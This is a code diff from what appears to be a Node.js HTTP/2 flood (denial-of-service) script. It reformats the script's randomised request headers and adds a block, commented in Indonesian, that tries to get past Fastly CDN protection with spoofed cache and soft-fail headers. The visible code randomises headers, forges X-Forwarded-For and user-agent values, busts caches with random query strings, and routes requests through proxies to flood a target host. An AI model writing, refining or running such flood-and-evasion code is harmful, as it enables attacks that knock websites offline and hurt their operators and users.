@@ -493,36 +493,45 @@ const randstrsValue = randstrs(10);
             }
 
      const rateHeaders = [
-        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
-        {"Access-Control-Request-Method": "GET"},
-        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
-        { "origin": "https://" + parsedTarget.host},
-        { "source-ip": randstr(5)  },
-        //{"x-aspnet-version" : randstrsValue},
-        { "data-return" :"false"},
-        {"X-Forwarded-For" : parsedProxy[0]},
-        {"NEL" : val},
-        {"dnt" : "1" },
-        { "A-IM": "Feed" },
-        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
-       {'Delta-Base' : '12340001'},
-       {"te": "trailers"},
-       {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
+    {"accept": accept_header[Math.floor(Math.random() * accept_header.length)]},
+    {"Access-Control-Request-Method": "GET"},
+    {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
+    {"origin": "https://" + parsedTarget.host},
+    {"source-ip": randstr(5)},
+    {"data-return": "false"},
+    {"X-Forwarded-For": parsedProxy[0]},
+    {"NEL": val},
+    {"dnt": "1"},
+    {"A-IM": "Feed"},
+    {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
+    {'Delta-Base': '12340001'},
+    {"te": "trailers"},
+    {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
 ];
+
+// Logika untuk bypass ISP Fastly
+const bypassFastlyHeaders = {
+    "Fastly-Soft-Fail": "1", // Mengindikasikan untuk tidak memblokir permintaan
+    "Surrogate-Key": "bypass", // Kunci untuk menghindari cache
+};
+
 let headers = {
-  ":authority": parsedTarget.host,
-  ":scheme": "https",
-  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
-  ":method": "GET",
-  "pragma" : "no-cache",
-  "upgrade-insecure-requests" : "1",
-  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
-  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
-  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
-  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
-  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
-  "user-agent" :  "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
-}
+    ":authority": parsedTarget.host,
+    ":scheme": "https",
+    ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
+    ":method": "GET",
+    "pragma": "no-cache",
+    "upgrade-insecure-requests": "1",
+    "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
+    "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
+    "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
+    "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
+    "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
+    "user-agent": "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha + " " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
+};
+
+// Menggabungkan headers dengan bypass Fastly
+headers = { ...headers, ...bypassFastlyHeaders };
  const proxyOptions = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
